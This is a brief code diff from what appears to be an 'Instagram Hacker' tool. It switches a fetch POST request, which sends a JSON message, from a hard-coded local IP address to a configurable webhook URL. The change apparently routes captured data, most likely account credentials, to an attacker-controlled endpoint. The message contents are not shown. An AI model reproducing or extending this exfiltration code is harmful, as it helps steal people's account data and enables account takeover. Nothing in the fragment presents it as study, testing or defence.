@@ -33,7 +33,7 @@
                                 username: "Instagram Hacker",
                                 };
 
-                            fetch('http://192.168.0.106:1234/', {
+                            fetch(webhookURL, {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify(mensaje)
